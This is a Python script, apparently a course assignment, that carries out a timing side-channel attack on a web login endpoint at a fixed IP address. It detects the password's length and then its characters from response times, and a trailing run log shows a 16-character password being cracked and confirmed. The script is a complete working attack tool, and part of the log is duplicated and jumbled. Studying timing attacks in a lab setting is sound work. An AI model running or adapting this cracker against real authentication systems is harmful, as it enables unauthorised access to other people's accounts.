"""
Timing Side-Channel Attack Implementation
Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

This module implements a timing side-channel attack to crack passwords
by measuring response times from a vulnerable authentication system.
"""

import requests
import time
import logging
from typing import Dict, Optional, List
from dataclasses import dataclass


# ============================================================================
# Configuration Classes
# ============================================================================

@dataclass
class AttackConfig:
    """Configuration parameters for the timing attack."""

    # base_url: str = "http://127.0.0.1/"
    base_url: str = "http://132.72.81.37/"
    user_name: str = "316279942"
    difficulty: int = 1
    max_password_length: int = 32
    charset: str = "abcdefghijklmnopqrstuvwxyz"
    samples_per_test: int = 5

    def get_test_url(self, password: str) -> str:
        """Construct test URL with current parameters."""
        return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"


# ============================================================================
# Logging Setup
# ============================================================================

class AttackLogger:
    """Centralized logging for timing attack operations."""

    def __init__(self, log_level: int = logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(log_level)

        # Console handler with formatting
        console_handler = logging.StreamHandler()
        console_handler.setLevel(log_level)

        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )
        console_handler.setFormatter(formatter)

        self.logger.addHandler(console_handler)

    def info(self, message: str):
        """Log info message."""
        self.logger.info(message)

    def debug(self, message: str):
        """Log debug message."""
        self.logger.debug(message)

    def warning(self, message: str):
        """Log warning message."""
        self.logger.warning(message)

    def error(self, message: str):
        """Log error message."""
        self.logger.error(message)

    def print_separator(self, char: str = "=", length: int = 80):
        """Print a visual separator line."""
        print(char * length)

    def print_header(self, text: str):
        """Print a formatted header."""
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str):
        """Print a formatted section header."""
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# HTTP Request Handler
# ============================================================================

class RequestHandler:
    """Handles HTTP requests with timing measurements."""

    def __init__(self, logger: AttackLogger):
        self.logger = logger
        self.total_requests = 0

    def send_request(self, url: str) -> requests.Response:
        """
        Send a single HTTP request and return the response.

        Args:
            url: The URL to request

        Returns:
            Response object containing timing and result data
        """
        self.total_requests += 1
        try:
            response = requests.get(url, timeout=10)
            return response
        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            raise

    def measure_timing(self, url: str, samples: int) -> float:
        """
        Measure average response time over multiple samples.

        Args:
            url: The URL to test
            samples: Number of samples to average

        Returns:
            Average response time in seconds
        """
        total_time = 0.0
        for _ in range(samples):
            response = self.send_request(url)
            total_time += response.elapsed.total_seconds()

        return total_time / samples

    def get_request_count(self) -> int:
        """Return total number of requests made."""
        return self.total_requests


# ============================================================================
# Password Length Detector
# ============================================================================

class PasswordLengthDetector:
    """Detects password length using timing analysis."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def detect_length(self) -> int:
        """
        Detect the password length by testing response times for different lengths.

        Returns:
            Detected password length
        """
        self.logger.print_section("PHASE 1: Password Length Detection")

        timing_data: Dict[int, float] = {}

        for length in range(1, self.config.max_password_length + 1):
            test_password = "a" * length
            test_url = self.config.get_test_url(test_password)

            avg_time = self.request_handler.measure_timing(
                test_url,
                self.config.samples_per_test
            )
            timing_data[length] = avg_time

            self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")

        # Find length with maximum response time
        detected_length = max(timing_data, key=timing_data.get)

        self.logger.info(f"✓ Detected password length: {detected_length} characters")
        self._print_timing_summary(timing_data, detected_length)

        return detected_length

    def _print_timing_summary(self, timing_data: Dict[int, float], detected: int):
        """Print summary of timing measurements."""
        print("\n  Top 5 Candidates by Response Time:")
        sorted_lengths = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        for i, (length, time_val) in enumerate(sorted_lengths[:5], 1):
            marker = "◄ SELECTED" if length == detected else ""
            print(f"    {i}. Length {length:2d}: {time_val:.6f}s {marker}")


# ============================================================================
# Character Cracker
# ============================================================================

class CharacterCracker:
    """Cracks individual password characters using timing analysis."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def crack_position(self, current_password: str, password_length: int, position: int) -> str:
        """
        Crack a single character position in the password.

        Args:
            current_password: Password discovered so far
            password_length: Total password length
            position: Current position being cracked (1-indexed)

        Returns:
            The cracked character for this position
        """
        self.logger.info(f"Testing position {position}/{password_length}...")

        timing_data: Dict[str, float] = {}

        # Test each character in charset
        for char in self.config.charset:
            test_password = self._build_test_password(
                current_password, char, password_length
            )
            test_url = self.config.get_test_url(test_password)

            total_time = 0.0
            for _ in range(self.config.samples_per_test):
                response = self.request_handler.send_request(test_url)
                total_time += response.elapsed.total_seconds()

            avg_time = total_time / self.config.samples_per_test
            timing_data[char] = avg_time

        # Select character with longest response time
        best_char = max(timing_data, key=timing_data.get)

        self._print_position_results(timing_data, best_char, position)

        return best_char

    def _build_test_password(self, prefix: str, test_char: str, total_length: int) -> str:
        """Build a test password with padding."""
        remaining_length = total_length - len(prefix) - 1
        return prefix + test_char + ("a" * remaining_length)

    def _print_position_results(self, timing_data: Dict[str, float], best: str, position: int):
        """Print results for current position."""
        sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        best_time = timing_data[best]

        print(f"\n  Top 5 candidates for position {position}:")
        for i, (char, time_val) in enumerate(sorted_chars[:5], 1):
            diff = time_val - best_time
            marker = "◄ SELECTED" if char == best else ""
            print(f"    {i}. '{char}': {time_val:.6f}s (Δ {diff:+.6f}s) {marker}")


# ============================================================================
# Last Character Verifier
# ============================================================================

class LastCharacterVerifier:
    """Verifies the last character by checking actual authentication."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def verify_last_char(self, current_password: str) -> Optional[str]:
        """
        Verify the last character by testing actual authentication.

        Args:
            current_password: Password discovered so far (all except last char)

        Returns:
            The correct last character, or None if not found
        """
        self.logger.print_section(f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})")

        for char in self.config.charset:
            test_password = current_password + char
            test_url = self.config.get_test_url(test_password)

            response = self.request_handler.send_request(test_url)

            if response.text == "1":
                self.logger.info(f"✓ Found correct last character: '{char}'")
                return char

        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Main Password Cracker
# ============================================================================

class PasswordCracker:
    """Main orchestrator for the password cracking attack."""

    def __init__(self, config: AttackConfig, logger: AttackLogger):
        self.config = config
        self.logger = logger
        self.request_handler = RequestHandler(logger)
        self.length_detector = PasswordLengthDetector(config, self.request_handler, logger)
        self.char_cracker = CharacterCracker(config, self.request_handler, logger)
        self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)

    def crack_from_scratch(self) -> str:
        """
        Crack the entire password from scratch.

        Returns:
            The cracked password
        """
        start_time = time.time()

        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Samples per test: {self.config.samples_per_test}")
        print()

        # Phase 1: Detect password length
        password_length = self.length_detector.detect_length()

        # Phase 2: Crack each character position
        cracked_password = self._crack_all_positions(password_length)

        # Final verification
        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def crack_with_resume(self, resume_from: str, password_length: int) -> str:
        """
        Resume cracking from a partially discovered password.

        Args:
            resume_from: Partially discovered password
            password_length: Known password length

        Returns:
            The fully cracked password
        """
        start_time = time.time()

        self.logger.print_header("RESUMING PASSWORD CRACKING")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Resume from: '{resume_from}' (Position {len(resume_from) + 1}/{password_length})")
        print()

        cracked_password = self._crack_from_position(resume_from, password_length)

        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def _crack_all_positions(self, password_length: int) -> str:
        """Crack all character positions."""
        self.logger.print_section("PHASE 2: Character Position Cracking")

        current_password = ""

        for position in range(1, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _crack_from_position(self, resume_from: str, password_length: int) -> str:
        """Crack remaining positions from resume point."""
        current_password = resume_from
        start_position = len(resume_from) + 1

        for position in range(start_position, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _print_final_results(self, password: str, elapsed_time: float):
        """Print final results and statistics."""
        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{password}'")
        print(f"  ⏱ Total Time: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
        print(f"  📊 Total Requests: {self.request_handler.get_request_count()}")
        print(f"  ⚡ Avg Time per Request: {elapsed_time/self.request_handler.get_request_count():.4f}s")
        self.logger.print_separator("=")

    def verify_password(self, password: str) -> bool:
        """
        Verify if a password is correct.

        Args:
            password: Password to verify

        Returns:
            True if password is correct, False otherwise
        """
        test_url = self.config.get_test_url(password)
        response = self.request_handler.send_request(test_url)

        is_correct = response.text == "1"
        status = "✓ CORRECT" if is_correct else "✗ INCORRECT"

        self.logger.info(f"Password verification: {status}")
        self.logger.debug(f"Response time: {response.elapsed.total_seconds():.6f}s")

        return is_correct


# ============================================================================
# Main Execution
# ============================================================================

def main():
    """Main execution function."""

    # Configuration
    config = AttackConfig(
        base_url="http://132.72.81.37/",
        # base_url="http://127.0.0.1/",
        user_name="316279942",
        difficulty=1,
        samples_per_test=2
    )


    # Logger
    logger = AttackLogger(log_level=logging.INFO)

    # Initialize cracker
    cracker = PasswordCracker(config, logger)

    # Option 1: Crack from scratch
    cracked_password = cracker.crack_from_scratch()

    # Option 2: Resume from partial password
    # resume_from = "boovghcfslcajgf"
    # password_length = 16
    # cracked_password = cracker.crack_with_resume(resume_from, password_length)

    # Verify the result
    print()
    logger.print_section("FINAL VERIFICATION")
    cracker.verify_password(cracked_password)


if __name__ == "__main__":
    main()


# """
# PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> & C:\Users\dorfe\AppData\Local\Programs\Python\Python313\python.exe "c:/Users/dorfe/OneDrive/Desktop/Projects_2025/Milumentor/Masters/Atacks/Atcks Drill 1/atck_try.py"
# ================================================================================
#   TIMING SIDE-CHANNEL PASSWORD CRACKER
# ================================================================================
#   Target User: 316279942
#   Difficulty: 1
#   Samples per test: 1

# --------------------------------------------------------------------------------
#   PHASE 1: Password Length Detection
# --------------------------------------------------------------------------------
# 11:42:02 | INFO     | ✓ Detected password length: 16 characters

#   Top 5 Candidates by Response Time:
#     1. Length 16: 0.531498s ◄ SELECTED
#     2. Length 17: 0.016865s
#     3. Length 30: 0.015368s
#     4. Length  7: 0.015255s
#     5. Length 18: 0.015032s
# --------------------------------------------------------------------------------
#   PHASE 2: Character Position Cracking
# --------------------------------------------------------------------------------
# 11:42:02 | INFO     | Testing position 1/16...

#   Top 5 candidates for position 1:
#     1. 'b': 0.782007s (Δ +0.000000s) ◄ SELECTED
#     2. 'c': 0.538554s (Δ -0.243453s)
#     3. 'p': 0.534575s (Δ -0.247432s)
#     4. 'g': 0.533723s (Δ -0.248284s)
#     5. 't': 0.533575s (Δ -0.248432s)
# 11:42:16 | INFO     | ✓ Password progress: 'b' (1/16)

# 11:42:16 | INFO     | Testing position 2/16...

#   Top 5 candidates for position 2:
#     1. 'o': 1.012901s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 0.790634s (Δ -0.222267s)
#     3. 'g': 0.789748s (Δ -0.223153s)
#     4. 'j': 0.788952s (Δ -0.223949s)
#     5. 'q': 0.787332s (Δ -0.225569s)
# 11:42:37 | INFO     | ✓ Password progress: 'bo' (2/16)

# 11:42:37 | INFO     | Testing position 3/16...

#   Top 5 candidates for position 3:
#     1. 'o': 1.260296s (Δ +0.000000s) ◄ SELECTED
#     2. 'j': 1.033335s (Δ -0.226961s)
#     3. 'r': 1.032711s (Δ -0.227585s)
#     4. 'p': 1.031507s (Δ -0.228789s)
#     5. 'l': 1.029572s (Δ -0.230724s)
# 11:43:04 | INFO     | ✓ Password progress: 'boo' (3/16)

# 11:43:04 | INFO     | Testing position 4/16...

#   Top 5 candidates for position 4:
#     1. 'v': 1.528763s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.286113s (Δ -0.242650s)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)

# 11:43:04 | INFO     | Testing position 4/16...

#   Top 5 candidates for position 4:
#     1. 'v': 1.528763s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.286113s (Δ -0.242650s)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)
# 11:43:04 | INFO     | Testing position 4/16...

#   Top 5 candidates for position 4:
#     1. 'v': 1.528763s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.286113s (Δ -0.242650s)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)
#   Top 5 candidates for position 4:
#     1. 'v': 1.528763s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.286113s (Δ -0.242650s)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)
#     2. 'h': 1.286113s (Δ -0.242650s)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)
#     5. 'a': 1.283423s (Δ -0.245340s)
# 11:43:37 | INFO     | ✓ Password progress: 'boov' (4/16)
#     3. 'e': 1.286015s (Δ -0.242748s)
#     4. 'l': 1.284728s (Δ -0.244035s)
#     5. 'a': 1.283423s (Δ -0.245340s)
# 11:43:37 | INFO     | ✓ Password progress: 'boov' (4/16)
#     5. 'a': 1.283423s (Δ -0.245340s)
# 11:43:37 | INFO     | ✓ Password progress: 'boov' (4/16)
# 11:43:37 | INFO     | ✓ Password progress: 'boov' (4/16)

# 11:43:37 | INFO     | Testing position 5/16...

#   Top 5 candidates for position 5:
#     1. 'g': 1.771506s (Δ +0.000000s) ◄ SELECTED
#     2. 'v': 1.538701s (Δ -0.232805s)
#     3. 's': 1.533744s (Δ -0.237762s)
#     4. 'b': 1.533463s (Δ -0.238043s)

#   Top 5 candidates for position 5:
#     1. 'g': 1.771506s (Δ +0.000000s) ◄ SELECTED
#     2. 'v': 1.538701s (Δ -0.232805s)
#     3. 's': 1.533744s (Δ -0.237762s)
#     4. 'b': 1.533463s (Δ -0.238043s)
#   Top 5 candidates for position 5:
#     1. 'g': 1.771506s (Δ +0.000000s) ◄ SELECTED
#     2. 'v': 1.538701s (Δ -0.232805s)
#     3. 's': 1.533744s (Δ -0.237762s)
#     4. 'b': 1.533463s (Δ -0.238043s)
#     3. 's': 1.533744s (Δ -0.237762s)
#     4. 'b': 1.533463s (Δ -0.238043s)
#     5. 'z': 1.531701s (Δ -0.239805s)
# 11:44:17 | INFO     | ✓ Password progress: 'boovg' (5/16)

# 11:44:17 | INFO     | Testing position 6/16...

#   Top 5 candidates for position 6:
#     1. 'h': 2.007529s (Δ +0.000000s) ◄ SELECTED
#     2. 'a': 1.787239s (Δ -0.220290s)
#     3. 'c': 1.786829s (Δ -0.220700s)
#     4. 'v': 1.784915s (Δ -0.222614s)
#     5. 'i': 1.784584s (Δ -0.222945s)
# 11:45:03 | INFO     | ✓ Password progress: 'boovgh' (6/16)

# 11:45:03 | INFO     | Testing position 7/16...

#   Top 5 candidates for position 7:
#     1. 'c': 2.263126s (Δ +0.000000s) ◄ SELECTED
#     2. 'q': 2.039116s (Δ -0.224010s)
#     3. 'y': 2.034470s (Δ -0.228656s)
#     4. 't': 2.032860s (Δ -0.230266s)
#     5. 'z': 2.032839s (Δ -0.230287s)
# 11:45:56 | INFO     | ✓ Password progress: 'boovghc' (7/16)

# 11:45:56 | INFO     | Testing position 8/16...

#   Top 5 candidates for position 8:
#     1. 'f': 2.508144s (Δ +0.000000s) ◄ SELECTED
#     2. 'j': 2.288354s (Δ -0.219790s)
#     3. 'd': 2.287849s (Δ -0.220295s)
#     4. 'y': 2.282007s (Δ -0.226137s)
#     5. 'a': 2.281323s (Δ -0.226821s)
# 11:46:55 | INFO     | ✓ Password progress: 'boovghcf' (8/16)

# 11:46:55 | INFO     | Testing position 9/16...

#   Top 5 candidates for position 9:
#     1. 's': 2.788188s (Δ +0.000000s) ◄ SELECTED
#     2. 'x': 2.540764s (Δ -0.247424s)
#     3. 'p': 2.537593s (Δ -0.250595s)
#     4. 'b': 2.533850s (Δ -0.254338s)
#     5. 'o': 2.530499s (Δ -0.257689s)
# 11:48:01 | INFO     | ✓ Password progress: 'boovghcfs' (9/16)

# 11:48:01 | INFO     | Testing position 10/16...

#   Top 5 candidates for position 10:
#     1. 'l': 3.032303s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 2.786439s (Δ -0.245864s)
#     3. 'b': 2.781539s (Δ -0.250764s)
#     4. 'u': 2.778482s (Δ -0.253821s)
#     5. 'i': 2.777478s (Δ -0.254825s)
# 11:49:13 | INFO     | ✓ Password progress: 'boovghcfsl' (10/16)

# 11:49:13 | INFO     | Testing position 11/16...

#   Top 5 candidates for position 11:
#     1. 'c': 3.510380s (Δ +0.000000s) ◄ SELECTED
#     2. 'a': 3.035184s (Δ -0.475196s)
#     3. 'p': 3.034751s (Δ -0.475629s)
#     4. 'x': 3.034295s (Δ -0.476085s)
#     5. 'r': 3.033781s (Δ -0.476599s)
# 11:50:33 | INFO     | ✓ Password progress: 'boovghcfslc' (11/16)

# 11:50:33 | INFO     | Testing position 12/16...

#   Top 5 candidates for position 12:
#     1. 'a': 3.533518s (Δ +0.000000s) ◄ SELECTED
#     2. 'z': 3.283947s (Δ -0.249571s)
#     3. 'v': 3.283399s (Δ -0.250119s)
#     4. 'n': 3.281910s (Δ -0.251608s)
#     5. 'j': 3.281885s (Δ -0.251633s)
# 11:51:58 | INFO     | ✓ Password progress: 'boovghcfslca' (12/16)

# 11:51:58 | INFO     | Testing position 13/16...

#   Top 5 candidates for position 13:
#     1. 'j': 3.760286s (Δ +0.000000s) ◄ SELECTED
#     2. 's': 3.535034s (Δ -0.225252s)
#     3. 'o': 3.534742s (Δ -0.225544s)
#     4. 'b': 3.533421s (Δ -0.226865s)
#     5. 'h': 3.528800s (Δ -0.231486s)
# 11:53:30 | INFO     | ✓ Password progress: 'boovghcfslcaj' (13/16)

# 11:53:30 | INFO     | Testing position 14/16...

#   Top 5 candidates for position 14:
#     1. 'g': 4.033737s (Δ +0.000000s) ◄ SELECTED
#     2. 's': 3.785150s (Δ -0.248587s)
#     3. 'm': 3.784633s (Δ -0.249104s)
#     4. 'k': 3.784514s (Δ -0.249223s)
#     5. 'l': 3.780483s (Δ -0.253254s)
# 11:55:08 | INFO     | ✓ Password progress: 'boovghcfslcajg' (14/16)

# 11:55:08 | INFO     | Testing position 15/16...

#   Top 5 candidates for position 15:
#     1. 'f': 4.251207s (Δ +0.000000s) ◄ SELECTED
#     2. 'r': 4.037206s (Δ -0.214001s)
#     3. 'h': 4.031650s (Δ -0.219557s)
#     4. 'k': 4.028580s (Δ -0.222627s)
#     5. 't': 4.028560s (Δ -0.222647s)
# 11:56:53 | INFO     | ✓ Password progress: 'boovghcfslcajgf' (15/16)

# --------------------------------------------------------------------------------
#   PHASE 3: Last Character Verification (Position 16)
# --------------------------------------------------------------------------------
# 11:58:23 | INFO     | ✓ Found correct last character: 'u'
# ================================================================================
#   ATTACK COMPLETE
# ================================================================================
#   ✓ CRACKED PASSWORD: 'boovghcfslcajgfu'
#   ⏱ Total Time: 980.84 seconds (16.35 minutes)
#   📊 Total Requests: 443
#   ⚡ Avg Time per Request: 2.2141s
# ================================================================================

# --------------------------------------------------------------------------------
#   FINAL VERIFICATION
# --------------------------------------------------------------------------------
# 11:58:27 | INFO     | Password verification: ✓ CORRECT
# """